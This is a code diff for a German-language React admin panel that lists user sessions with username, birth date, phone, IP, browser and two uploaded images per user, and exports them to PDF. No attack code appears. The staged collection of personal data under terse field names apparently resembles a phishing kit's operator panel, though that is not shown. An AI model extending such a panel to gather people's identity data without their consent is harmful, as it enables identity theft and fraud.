@@ -40,6 +40,11 @@ interface UserData {
     fileSize: number;
     filePath: string;
     mimeType: string;
+    filenameFirst?: string;
+    originalNameFirst?: string;
+    fileSizeFirst?: number;
+    filePathFirst?: string;
+    mimeTypeFirst?: string;
     timestamp: string;
     ip: string;
     userAgent: string;
@@ -361,23 +366,47 @@ const AdminPanel: React.FC = () => {
       yPosition = addText(`Telefonnummer: ${session.infoData?.xtel || session.finalData?.xtel || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition += 5;
 
-      // File Upload Information with Image
-      if (session.uploadData) {
-        yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
-        yPosition = addText(`Ursprünglicher Dateiname: ${session.uploadData.originalName}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-        yPosition = addText(`Dateigröße: ${Math.round(session.uploadData.fileSize / 1024)} KB`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-        yPosition += 5;
+      // File Upload Information with Images
+      if (session.uploadData && (session.uploadData.filename || session.uploadData.filenameFirst)) {
+        yPosition = addText('📁 Hochgeladene Dateien', margin, yPosition, pageWidth - 2 * margin, 12);
+        
+        // First Upload
+        if (session.uploadData.filenameFirst) {
+          yPosition = addText('Erste Upload:', margin + 10, yPosition, pageWidth - 2 * margin - 10, 10);
+          yPosition = addText(`Ursprünglicher Dateiname: ${session.uploadData.originalNameFirst}`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+          yPosition = addText(`Dateigröße: ${Math.round((session.uploadData.fileSizeFirst || 0) / 1024)} KB`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+          yPosition += 5;
 
-        // Add image to PDF
-        const imageUrl = `${API_BASE_URL.replace('/api', '')}/uploads/${session.uploadData.filename}`;
-        const imageWidth = pageWidth - 2 * margin - 20;
-        const imageHeight = 80;
-        
-        // Check if we need a new page for the image
-        checkNewPage(imageHeight + 20);
-        
-        await addImageToPDF(imageUrl, margin + 10, yPosition, imageWidth, imageHeight);
-        yPosition += imageHeight + 10;
+          // Add first image to PDF
+          const imageUrlFirst = `${API_BASE_URL.replace('/api', '')}/uploads/${session.uploadData.filenameFirst}`;
+          const imageWidth = pageWidth - 2 * margin - 20;
+          const imageHeight = 80;
+          
+          // Check if we need a new page for the image
+          checkNewPage(imageHeight + 20);
+          
+          await addImageToPDF(imageUrlFirst, margin + 10, yPosition, imageWidth, imageHeight);
+          yPosition += imageHeight + 10;
+        }
+
+        // Second Upload
+        if (session.uploadData.filename) {
+          yPosition = addText('Zweite Upload:', margin + 10, yPosition, pageWidth - 2 * margin - 10, 10);
+          yPosition = addText(`Ursprünglicher Dateiname: ${session.uploadData.originalName}`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+          yPosition = addText(`Dateigröße: ${Math.round(session.uploadData.fileSize / 1024)} KB`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+          yPosition += 5;
+
+          // Add second image to PDF
+          const imageUrl = `${API_BASE_URL.replace('/api', '')}/uploads/${session.uploadData.filename}`;
+          const imageWidth = pageWidth - 2 * margin - 20;
+          const imageHeight = 80;
+          
+          // Check if we need a new page for the image
+          checkNewPage(imageHeight + 20);
+          
+          await addImageToPDF(imageUrl, margin + 10, yPosition, imageWidth, imageHeight);
+          yPosition += imageHeight + 10;
+        }
       } else {
         yPosition = addText('📁 Hochgeladene Datei: Keine Datei hochgeladen', margin, yPosition, pageWidth - 2 * margin, 12);
         yPosition += 5;
@@ -440,117 +469,86 @@ const AdminPanel: React.FC = () => {
     yPosition = addText(`Telefonnummer: ${selectedUser.xtel || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition += 10;
 
-    // File Upload Information with Image
-    if (selectedUser.filename) {
-      yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
-      yPosition = addText(`Ursprünglicher Dateiname: ${selectedUser.originalName}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-      yPosition = addText(`Dateigröße: ${Math.round(selectedUser.size / 1024)} KB`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-      yPosition += 5;
+    // Helper function to add image to PDF
+    const addImageToPDFAsync = (imageUrl: string, yPos: number): Promise<number> => {
+      return new Promise((resolve) => {
+        fetch(imageUrl)
+          .then(response => {
+            if (response.ok) {
+              return response.blob();
+            } else {
+              throw new Error('Image not found');
+            }
+          })
+          .then(blob => {
+            const reader = new FileReader();
+            reader.onload = function() {
+              const base64 = reader.result as string;
+              const maxWidth = pageWidth - 2 * margin - 20;
+              const maxHeight = 100;
+              doc.addImage(base64, 'JPEG', margin + 10, yPos, maxWidth, maxHeight);
+              resolve(yPos + maxHeight + 10);
+            };
+            reader.onerror = () => {
+              yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPos, pageWidth - 2 * margin - 10);
+              resolve(yPos + 20);
+            };
+            reader.readAsDataURL(blob);
+          })
+          .catch(() => {
+            yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPos, pageWidth - 2 * margin - 10);
+            resolve(yPos + 20);
+          });
+      });
+    };
 
-      // Add image to PDF
-      try {
+    // File Upload Information with Images
+    if (selectedUser.filename || selectedUser.filenameFirst) {
+      yPosition = addText('📁 Hochgeladene Dateien', margin, yPosition, pageWidth - 2 * margin, 12);
+      
+      // First Upload
+      if (selectedUser.filenameFirst) {
+        yPosition = addText('Erste Upload:', margin + 10, yPosition, pageWidth - 2 * margin - 10, 10);
+        yPosition = addText(`Ursprünglicher Dateiname: ${selectedUser.originalNameFirst}`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+        yPosition = addText(`Dateigröße: ${Math.round((selectedUser.sizeFirst || 0) / 1024)} KB`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+        yPosition += 5;
+        
+        const imageUrlFirst = `${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filenameFirst}`;
+        yPosition = await addImageToPDFAsync(imageUrlFirst, yPosition);
+      }
+
+      // Second Upload
+      if (selectedUser.filename) {
+        yPosition = addText('Zweite Upload:', margin + 10, yPosition, pageWidth - 2 * margin - 10, 10);
+        yPosition = addText(`Ursprünglicher Dateiname: ${selectedUser.originalName}`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+        yPosition = addText(`Dateigröße: ${Math.round(selectedUser.size / 1024)} KB`, margin + 20, yPosition, pageWidth - 2 * margin - 20);
+        yPosition += 5;
+        
         const imageUrl = `${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`;
-        
-        // Fetch the image as blob
-        const response = await fetch(imageUrl);
-        if (response.ok) {
-          const blob = await response.blob();
-          const reader = new FileReader();
-          
-          reader.onload = function() {
-            const base64 = reader.result as string;
-            
-            // Calculate image dimensions to fit in PDF
-            const maxWidth = pageWidth - 2 * margin - 20;
-            const maxHeight = 100;
-            
-            // Add image to PDF
-            doc.addImage(base64, 'JPEG', margin + 10, yPosition, maxWidth, maxHeight);
-            yPosition += maxHeight + 10;
-            
-            // Technical Information
-            yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
-            yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-            yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-            yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-            yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-
-            // Footer
-            const footerY = doc.internal.pageSize.getHeight() - 20;
-            doc.setFontSize(8);
-            doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
-
-            // Download the PDF
-            const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
-            doc.save(fileName);
-          };
-          
-          reader.readAsDataURL(blob);
-        } else {
-          // If image fails to load, continue without image
-          yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPosition, pageWidth - 2 * margin - 10);
-          yPosition += 10;
-          
-          // Technical Information
-          yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
-          yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-          yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-          yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-          yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-
-          // Footer
-          const footerY = doc.internal.pageSize.getHeight() - 20;
-          doc.setFontSize(8);
-          doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
-
-          // Download the PDF
-          const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
-          doc.save(fileName);
-        }
-      } catch (error) {
-        console.error('Error loading image for PDF:', error);
-        // Continue without image
-        yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPosition, pageWidth - 2 * margin - 10);
-        yPosition += 10;
-        
-        // Technical Information
-        yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
-        yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-        yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-        yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-        yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-
-        // Footer
-        const footerY = doc.internal.pageSize.getHeight() - 20;
-        doc.setFontSize(8);
-        doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
-
-        // Download the PDF
-        const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
-        doc.save(fileName);
+        yPosition = await addImageToPDFAsync(imageUrl, yPosition);
       }
     } else {
       // No file uploaded
       yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
       yPosition = addText('Keine Datei hochgeladen', margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition += 10;
-
-      // Technical Information
-      yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
-      yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-      yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-      yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-      yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-
-      // Footer
-      const footerY = doc.internal.pageSize.getHeight() - 20;
-      doc.setFontSize(8);
-      doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
-
-      // Download the PDF
-      const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
-      doc.save(fileName);
     }
+    
+    // Technical Information
+    yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+    yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+
+    // Footer
+    const footerY = doc.internal.pageSize.getHeight() - 20;
+    doc.setFontSize(8);
+    doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
+
+    // Download the PDF
+    const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
+    doc.save(fileName);
   };
 
   const handleDeleteConfirm = async () => {
@@ -661,6 +659,9 @@ const AdminPanel: React.FC = () => {
           filename: '',
           originalName: '',
           size: 0,
+          filenameFirst: '',
+          originalNameFirst: '',
+          sizeFirst: 0,
           ip: '',
           userAgent: '',
           timestamp: '',
@@ -681,6 +682,9 @@ const AdminPanel: React.FC = () => {
         filename: session.uploadData?.filename || '',
         originalName: session.uploadData?.originalName || '',
         size: session.uploadData?.fileSize || 0,
+        filenameFirst: session.uploadData?.filenameFirst || '',
+        originalNameFirst: session.uploadData?.originalNameFirst || '',
+        sizeFirst: session.uploadData?.fileSizeFirst || 0,
         ip: session.ip || '',
         userAgent: session.userAgent || '',
         timestamp: session.createdAt || '',
@@ -760,33 +764,43 @@ const AdminPanel: React.FC = () => {
                   <td title={`Birth Date: ${user.xdob}`}>{user.xdob || '-'}</td>
                   <td title={`Phone: ${user.xtel}`}>{user.xtel || '-'}</td>
                   <td>
-                    {user.filename ? (
-                      <div className="file-display">
-                        <img 
-                          src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`}
-                          alt={user.originalName}
-                          className="uploaded-image"
-                          style={{width: '50px', height: '50px', objectFit: 'cover', cursor: 'pointer'}}
-                          onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`)}
-                          onLoad={() => {
-                            console.log('✅ Image loaded successfully:', user.filename);
-                          }}
-                          onError={(e) => {
-                            console.error('❌ Image failed to load:', user.filename, 'URL:', `${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`);
-                            e.currentTarget.style.display = 'none';
-                            const nextElement = e.currentTarget.nextElementSibling as HTMLElement;
-                            if (nextElement) {
-                              nextElement.style.display = 'block';
-                            }
-                          }}
-                        />
-                        <div className="file-info" style={{display: 'none'}}>
-                          {user.originalName}
-                          <br />
-                          <small>({Math.round(user.size / 1024)}KB)</small>
+                    <div style={{display: 'flex', gap: '5px', flexDirection: 'column'}}>
+                      {user.filenameFirst ? (
+                        <div className="file-display" style={{marginBottom: '5px'}}>
+                          <div style={{fontSize: '10px', color: '#666', marginBottom: '2px'}}>First:</div>
+                          <img 
+                            src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.filenameFirst}`}
+                            alt={user.originalNameFirst}
+                            className="uploaded-image"
+                            style={{width: '50px', height: '50px', objectFit: 'cover', cursor: 'pointer'}}
+                            onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${user.filenameFirst}`)}
+                            onError={(e) => {
+                              e.currentTarget.style.display = 'none';
+                            }}
+                          />
                         </div>
-                      </div>
-                    ) : '-'}
+                      ) : null}
+                      {user.filename ? (
+                        <div className="file-display">
+                          <div style={{fontSize: '10px', color: '#666', marginBottom: '2px'}}>Second:</div>
+                          <img 
+                            src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`}
+                            alt={user.originalName}
+                            className="uploaded-image"
+                            style={{width: '50px', height: '50px', objectFit: 'cover', cursor: 'pointer'}}
+                            onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`)}
+                            onLoad={() => {
+                              console.log('✅ Image loaded successfully:', user.filename);
+                            }}
+                            onError={(e) => {
+                              console.error('❌ Image failed to load:', user.filename, 'URL:', `${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`);
+                              e.currentTarget.style.display = 'none';
+                            }}
+                          />
+                        </div>
+                      ) : null}
+                      {!user.filename && !user.filenameFirst ? '-' : null}
+                    </div>
                   </td>
                   <td className="ip-address">{user.ip}</td>
                   <td>{getBrowserInfo(user.userAgent)}</td>
@@ -1083,37 +1097,83 @@ const AdminPanel: React.FC = () => {
                 </div>
 
                 {/* File Upload Information */}
-                {selectedUser.filename && (
+                {(selectedUser.filename || selectedUser.filenameFirst) && (
                   <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
-                    <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>📁 Hochgeladene Datei</h4>
-                    <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
-                      <div>
-                        <strong>Ursprünglicher Dateiname:</strong><br/>
-                        <span style={{color: '#333'}}>{selectedUser.originalName}</span>
+                    <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>📁 Hochgeladene Dateien</h4>
+                    
+                    {/* First Upload */}
+                    {selectedUser.filenameFirst && (
+                      <div style={{marginBottom: '20px', padding: '10px', backgroundColor: '#f9f9f9', borderRadius: '4px'}}>
+                        <h5 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>Erste Upload</h5>
+                        <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                          <div>
+                            <strong>Ursprünglicher Dateiname:</strong><br/>
+                            <span style={{color: '#333'}}>{selectedUser.originalNameFirst}</span>
+                          </div>
+                          <div>
+                            <strong>Dateigröße:</strong><br/>
+                            <span style={{color: '#333'}}>{Math.round((selectedUser.sizeFirst || 0) / 1024)} KB</span>
+                          </div>
+                        </div>
+                        <div style={{marginTop: '10px'}}>
+                          <strong>Dateivorschau:</strong><br/>
+                          <img 
+                            src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filenameFirst}`}
+                            alt={selectedUser.originalNameFirst}
+                            style={{
+                              width: '100px',
+                              height: '100px',
+                              objectFit: 'cover',
+                              border: '1px solid #ddd',
+                              borderRadius: '4px',
+                              marginTop: '5px',
+                              cursor: 'pointer'
+                            }}
+                            onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filenameFirst}`)}
+                            onError={(e) => {
+                              e.currentTarget.style.display = 'none';
+                            }}
+                          />
+                        </div>
                       </div>
-                      <div>
-                        <strong>Dateigröße:</strong><br/>
-                        <span style={{color: '#333'}}>{Math.round(selectedUser.size / 1024)} KB</span>
+                    )}
+
+                    {/* Second Upload */}
+                    {selectedUser.filename && (
+                      <div style={{padding: '10px', backgroundColor: '#f9f9f9', borderRadius: '4px'}}>
+                        <h5 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>Zweite Upload</h5>
+                        <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                          <div>
+                            <strong>Ursprünglicher Dateiname:</strong><br/>
+                            <span style={{color: '#333'}}>{selectedUser.originalName}</span>
+                          </div>
+                          <div>
+                            <strong>Dateigröße:</strong><br/>
+                            <span style={{color: '#333'}}>{Math.round(selectedUser.size / 1024)} KB</span>
+                          </div>
+                        </div>
+                        <div style={{marginTop: '10px'}}>
+                          <strong>Dateivorschau:</strong><br/>
+                          <img 
+                            src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`}
+                            alt={selectedUser.originalName}
+                            style={{
+                              width: '100px',
+                              height: '100px',
+                              objectFit: 'cover',
+                              border: '1px solid #ddd',
+                              borderRadius: '4px',
+                              marginTop: '5px',
+                              cursor: 'pointer'
+                            }}
+                            onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`)}
+                            onError={(e) => {
+                              e.currentTarget.style.display = 'none';
+                            }}
+                          />
+                        </div>
                       </div>
-                    </div>
-                    <div style={{marginTop: '10px'}}>
-                      <strong>Dateivorschau:</strong><br/>
-                      <img 
-                        src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`}
-                        alt={selectedUser.originalName}
-                        style={{
-                          width: '100px',
-                          height: '100px',
-                          objectFit: 'cover',
-                          border: '1px solid #ddd',
-                          borderRadius: '4px',
-                          marginTop: '5px'
-                        }}
-                        onError={(e) => {
-                          e.currentTarget.style.display = 'none';
-                        }}
-                      />
-                    </div>
+                    )}
                   </div>
                 )}
 
